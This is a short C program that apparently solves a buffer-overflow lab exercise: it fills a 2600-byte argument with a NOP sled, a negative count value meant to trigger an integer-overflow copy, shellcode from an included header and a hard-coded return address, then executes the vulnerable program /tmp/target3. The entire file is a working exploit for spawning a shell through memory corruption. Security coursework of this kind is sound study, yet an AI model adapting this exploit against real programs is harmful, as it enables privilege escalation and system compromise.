#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
static char head_of_buf[] = "\x48\xea\xff\xbf\x00";
static char number[] = "-268435295,";
int off = 11;

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  char sp[2600];
  memset(sp, 0x90, sizeof(sp));
  memcpy(sp, number, 11);
  memcpy((sp + off), shellcode, strlen(shellcode));
  memcpy((sp + 2560 + 4 + off), head_of_buf, 5);

  args[1] = sp;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
